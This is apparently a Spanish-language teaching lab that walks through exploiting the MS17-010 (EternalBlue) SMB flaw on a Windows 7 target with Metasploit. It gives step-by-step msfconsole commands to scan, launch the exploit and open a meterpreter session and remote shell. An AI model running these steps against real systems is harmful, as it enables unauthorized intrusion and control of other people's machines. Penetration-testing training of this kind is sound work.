Explotación de vulnerabilidad utilizando metasploit
===============
Este laboratorio es para fines educativos y su contenido no debe ser utilizado para fines ilícitos  

**Objetivos**
* Experimentar la explotación de una vulnerabilidad 
* Interactuar con la consola de comandos de metasploit. 
* Interactuar con la consola de comandos de meterpreter.  

**Requisitos**
* Máquina objetivo: Windows 7 64bits  
* Equipo Auditor: Kali Linux 

**Utilizar un scanner auxiliar para detercar si el equipo es vulnerable a  MS17-010**
* Desde Kali Linux Inicie una sesión de terminal y escriba los siguientes comandos:
```
msfconsole
```
![alt text](./lab01-images/lab01-fig1-msf-console.png "Metasploit framework")

```
Search ms17_10
```
![alt text](./lab01-images/lab01-fig2-msf-console.PNG "Metasploit framework")
```
use auxiliary/scanner/smb/smb_ms17_010
``` 
```
set RHOSTS “Dirección IP del host windows 7 64bits”
```
```
run
```
![alt text](./lab01-images/lab01-fig3-msf-console.PNG "Metasploit framework")
**utilizar un módulo para explotar la vulnerabilidad ms17_010**
```
use exploit/windows/smb/ms17_010_eternalblue ```
```
```
show options
``` 
```
set RHOST “Dirección IP del host windows 7 64bits” 
```
```
exploit 
```
![alt text](./lab01-images/lab01-fig3-msf-console.PNG "Metasploit framework")
 
**Post Explotación**
```bash
Sysinfo
```
![alt text](./lab01-images/lab01-fig5-msf-console.PNG "Metasploit framework")
```bash
Getuid
```
![alt text](./lab01-images/lab01-fig6-msf-console.PNG "Metasploit framework")
```Bash
Shell
```
![alt text](./lab01-images/lab01-fig7-msf-console.PNG "Metasploit framework")

**Enlace para mayor información**

[Sobre Metasploit Framework] (https://www.metasploit.com/)

[Comandos usados en  Measploit Framework] (https://www.offensive-security.com/
metasploit-unleashed/msfconsole-commands/)

[Fundamentos de meterpreter] (https://www.offensive-security.com/metasploit-unleashed/meterpreter-basics/)
